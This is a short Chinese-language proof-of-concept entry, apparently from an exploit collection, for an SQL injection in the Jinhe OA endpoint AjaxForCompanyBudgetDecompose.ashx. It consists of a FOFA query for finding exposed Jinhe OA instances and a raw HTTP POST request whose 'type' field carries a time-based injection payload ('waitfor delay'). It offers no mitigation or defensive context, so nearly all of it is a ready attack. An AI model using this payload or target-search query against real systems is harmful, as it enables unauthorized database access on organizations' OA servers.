# 金和OA-AjaxForCompanyBudgetDecompose.ashx存在SQL注入

## fofa
```javascript
app="金和网络-金和OA"
```

## poc
```javascript
POST /c6/JHSoft.Web.CostControl/Decompose/AjaxForCompanyBudgetDecompose.ashx HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded

strType=getBudgetTime&strDeptId=1&strYear=2012&type=1'waitfor delay '0:0:4'--&TimeType=1
```
